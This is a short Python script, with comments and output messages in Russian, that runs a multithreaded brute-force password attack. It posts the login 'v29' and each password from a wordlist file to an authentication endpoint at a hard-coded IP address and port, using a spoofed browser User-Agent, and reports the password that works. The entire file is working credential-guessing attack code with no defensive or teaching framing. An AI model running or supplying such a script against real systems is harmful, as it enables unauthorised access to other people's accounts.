import requests
import threading

THREADS_NUM = 30
HOST = 'http://185.87.48.157:5048/auth'

port = 5048
login = 'v29'

right_pass = ''
count = 1

lock = threading.Lock()

password_list = []

with open('pwlist.txt', 'r', encoding='UTF-8') as file:
    for line in file:
        password_list.append(line.removesuffix('\n'))


def check_password(pass_list):
    global count
    global right_pass
    for password in pass_list:
        json = {"login": login, "password": password}
        headers = {"Accept": "*/*",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                                 "AppleWebKit/537.36 (KHTML, like Gecko)"
                                 "Chrome/107.0.0.0 Safari/537.36"}
        try:
            request = requests.post(url=HOST, json=json, headers=headers, timeout=10)
            if request.status_code == 200:
                print('\033[31m Успех! Пароль верный! \033[0m', login, password)
                print('Кол-во попыток:', count)
                right_pass = password
                return right_pass
            else:
                print('Неверный пароль: ', login, password)

        except Exception as exc:
            print(exc)
            print('\n')
        with lock:
            count += 1


threads_list = []

one_thread_check_count = len(password_list) // THREADS_NUM

for i in range(1, len(password_list) + 1, one_thread_check_count):
    threads_list.append(threading.Thread(
        target=check_password,
        args=[password_list[i:(i + one_thread_check_count)]]
    ))

for i_thread in threads_list:
    i_thread.start()

for i_thread in threads_list:
    i_thread.join()

if right_pass:
    print('Ураааааааааааааааа!!! Пароль: ', right_pass, count)
    print('Нажмите любую клавишу...')
    a = input()


